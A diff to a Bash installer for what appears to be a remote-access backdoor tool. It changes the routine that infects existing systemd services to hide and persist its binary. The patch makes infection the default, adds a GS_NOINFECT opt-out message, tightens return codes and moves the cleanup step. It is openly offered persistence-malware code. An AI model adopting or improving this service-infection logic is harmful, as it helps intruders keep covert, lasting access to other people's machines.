@@ -635,6 +635,9 @@ init_vars()
 	# set PWD if not set
 	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
 
+	[[ "$GS_BEACON" -eq 0 ]] && unset GS_BEACON
+	[[ "$GS_DEBUG" -eq 0 ]] && unset GS_DEBUG
+
 	[[ -z "$OSTYPE" ]] && {
 		local osname
 		osname="$(uname -s)"
@@ -1348,7 +1351,7 @@ install_systemd_infect() {
 	INFECTED_BIN_NAME="${bin}"
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
-	OK_OUT
+	OK_OUT "Experimental. Set GS_NOINFECT=1 to disable."
 	# FIXME: It would be better if I do this BEFORE installing the service or otherwise we can not
 	# recover if this fails:
 	do_config2bin "${DSTBIN}" "${bin}" "-liq" "" || return 255
@@ -1361,11 +1364,15 @@ install_system_systemd()
 	local i
 	[[ ! -d "${SERVICE_DIR}" ]] && return 255
 	command -v systemctl >/dev/null || return 255
+	[[ -n "$IS_INSTALLED" ]] && return 0
 
 	# test for:
 	# 1. offline
 	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
-	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return 255
+
+	# printf "%-70.70s" "Infecting systemd service....................................................................."
+	# SKIP_OUT "GS_NOINFECT=1 is set"
 
 	if [[ -n $GS_INFECT ]]; then
 		i=0
@@ -1373,16 +1380,12 @@ install_system_systemd()
 			install_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECT_BIN_NAME_ARR[$i]}"
 			((i++))
 		done
-	else
-		printf "%-70.70s" "Infecting systemd service....................................................................."
-		SKIP_OUT "GS_INFECT=1 not set"
+		[[ -n "$IS_INSTALLED" ]] && {
+			xrm "${DSTBIN}"
+			unset DSTBIN
+			return 0
+		}
 	fi
-
-	[[ -n "$IS_INSTALLED" ]] && {
-		xrm "${DSTBIN}"
-		unset DSTBIN
-		return 0
-	}
 
 	install_systemd_new
 	[[ -n "$IS_INSTALLED" ]] && return 0
